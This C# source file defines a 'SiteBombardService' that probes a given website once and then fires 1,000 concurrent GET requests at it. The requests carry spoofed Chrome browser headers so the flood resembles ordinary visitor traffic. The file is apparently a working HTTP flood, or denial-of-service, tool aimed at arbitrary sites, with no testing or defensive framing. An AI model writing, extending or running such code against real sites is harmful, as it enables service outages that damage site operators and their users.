using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Core.Abstractions;
using Microsoft.Extensions.Logging;

namespace Core;

public class SiteBombardService : ISiteBombardService
{
    private const int IterationsCount = 1000;
    private readonly IHttpClientFactory _httpClientFactory;

    public SiteBombardService(IHttpClientFactory httpClientFactory)
    {
        _httpClientFactory = httpClientFactory;
    }

    public async Task BombardAsync(string siteUrl, ILogger logger)
    {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11;
        
        var list = new List<Task>(IterationsCount);

        var client = _httpClientFactory.CreateClient("sites");

        var isSuccess = await MakeRequestAsync(siteUrl, logger, client);

        if (!isSuccess)
        {
            return;
        }
        
        for (var i = 0; i < IterationsCount; i++)
        {
            list.Add(MakeRequestAsync(siteUrl, logger, client));
        }

        await Task.WhenAll(list);
    }
    
    private static async Task<bool> MakeRequestAsync(string siteUrl, ILogger logger, HttpMessageInvoker client)
    {
        try
        {
            using var request = new HttpRequestMessage(HttpMethod.Get, new Uri(siteUrl));
            
            request.Headers.TryAddWithoutValidation("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            request.Headers.TryAddWithoutValidation("Accept-Encoding", "gzip, deflate");
            request.Headers.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36");
            request.Headers.TryAddWithoutValidation("Accept-Charset", "ISO-8859-1");

            var result = await client.SendAsync(request, CancellationToken.None);

            return result.IsSuccessStatusCode;
        }
        catch (Exception e)
        {
            logger.LogError(e, $@"exception on: {siteUrl}. message: {e.Message}");
            return false;
        }
    }
}